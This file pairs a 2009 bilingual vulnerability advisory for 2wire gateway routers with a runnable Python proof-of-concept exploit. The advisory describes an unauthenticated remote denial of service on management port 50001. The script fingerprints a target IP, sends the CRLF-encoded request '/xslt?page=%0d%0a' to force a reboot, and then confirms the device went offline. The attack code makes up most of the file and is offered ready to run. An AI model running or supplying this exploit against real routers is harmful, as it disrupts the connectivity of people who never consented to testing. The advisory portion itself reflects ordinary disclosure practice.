@@ -1,0 +1,132 @@
+"""           ========================================
+               2WIRE REMOTE DENIAL OF SERVICE
+         ========================================
+
+
+Device:		2wire Gateway Router/Modem
+Vulnerable Software:	< 5.29.52
+Vulnerable Models:	1700HG
+			1701HG
+			1800HW
+			2071
+			2700HG
+			2701HG-T
+Release Date: 	2009-09-00
+Last Update: 	2009-09-00
+Critical: 	Moderately critical
+Impact: 	Denial of service
+		Remote router reboot
+Where:		From remote
+		In the remote management interface
+Solution Status:	Vendor issued firmware patches
+			Providers are in charge of applying the patches
+WebVuln Advisory:	1-003
+
+
+  BACKGROUND
+=======================
+
+The remote management interface of some 2wire modems is enabled by default.
+This interface runs over SSL on port 50001 with an untrusted issuer certificate.
+
+++Español
+Algunos módems 2wire tienen la interfaz remota habilitada por default.
+La interfaz utiliza SSL con un certificado invalido en el puerto 50001.
+
+
+   DESCRIPTION
+=======================
+
+Some 2wire modems are vulnerable to a remote denial of service attack.
+By requesting a special url from the Remote Management interface, an unathenticated
+user can remotely reboot the complete device.
+
+++
+Algunos módems 2wire son vulnerables a un ataque de denegación de servicio.
+Un usuario no autenticado puede reiniciar el dispositivo enviando una petición a
+la interfaz de Administración remota.
+
+
+  EXPLOIT / POC
+=======================
+
+ https://<remoteIP>:50001/xslt?page=%0d%0a
+
+
+  WORKAROUND
+=======================
+
+Disable Remote Management in Firewall -> Advanced Settings.
+
+++
+Deshabilitar Administración remota en Cortafuegos -> Configuración avanzada
+
+
+   DISCLOSURE TIMELINE
+=======================
+
+2009/09/06 - Vulnerability discovered
+2009/09/08 - Vendor contacted
+
+
+                  =======================
+
+                           h k m
+                        hkm@hakim.ws
+                    http://www.hakim.ws
+
+                  =======================
+Greets:
+preth00nker, DromoroK, mr.ebola, Javier, d0ct0r_4rz0v1zp0, ch@vez, fito, HL, Xianur0, Pr@fEs0r X, Daemon.
+
+
+  REFERENCES
+=======================
+
+Preth00nker's exploit (LAN) - http://www.milw0rm.com/exploits/2246
+2Wire Gateways CRLF DoS (from local network) - http://secunia.com/advisories/21583
+Hakim.Ws - http://www.hakim.ws
+WebVuln - http://www.webvuln.com"""
+
+#  POC
+#=======================
+
+print "\n     #################################################"
+print "    #         2WIRE REMOTE DoS (FW =< 5.29.52)       #"
+print "   #                                               #"
+print "  #                  hkm@hakim.ws                 #"
+print " #################################################\n"
+
+import socket, sys, urllib2 
+
+socket.setdefaulttimeout(4)
+
+try:
+	ip = sys.argv[1]
+except:
+	print " [IP ERROR] -> python 2os.py 123.123.123.123\n"
+	sys.exit()
+
+if not len(ip.split(".")) == 4:
+	print " [IP ERROR] -> python 2os.py 123.123.123.123\n"
+	sys.exit()
+
+print " [ ] Detectando el dispositivo"
+try:
+	server = str(urllib2.urlopen(urllib2.Request("https://"+str(ip)+":50001/xslt?page=CD35_SETUP_01")).info())
+	print " [+] Detectado "+server[int(server.find("Server:"))+8:int(server.find("\n",int(server.find("Server:"))))]
+except:
+	print " [-] No detectado\n"
+	sys.exit()
+
+print " [ ] Lanzando el ataque"
+try:	str(urllib2.urlopen(urllib2.Request("https://"+str(ip)+":50001/xslt?page=%0d%0a")).read())
+except:	pass
+
+try:
+	server = str(urllib2.urlopen(urllib2.Request("https://"+str(ip)+":50001/xslt?page=CD35_SETUP_01")).info())
+	print " [-] No vulnerable\n"
+except:
+	print " [+] MODEM RESETADO! EAEA!\n"
+	sys.exit()
+
